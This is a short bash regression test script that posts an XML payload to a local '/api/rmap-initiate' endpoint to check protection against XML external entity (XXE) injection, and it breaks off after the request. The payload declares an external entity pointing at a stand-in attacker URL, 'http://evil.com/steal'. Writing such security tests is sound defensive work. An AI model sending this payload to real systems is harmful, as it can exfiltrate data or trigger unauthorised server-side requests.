#!/bin/bash
# Regression Test: rt_xxe_rmap_external
# Description: Test XXE protection (external entity)
# Generated: 2025-10-17T18:58:26.235867

BASE_URL="${1:-http://localhost:5000}"
TEST_NAME="rt_xxe_rmap_external"

echo "Running regression test: $TEST_NAME"
echo "Description: Test XXE protection (external entity)"
echo ""

# Test payload injection in RMAP
RESPONSE=$(curl -s -X POST "$BASE_URL/api/rmap-initiate" \
    -H "Content-Type: application/xml" \
    -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]><root>&xxe;</root>' 2>/dev/null)
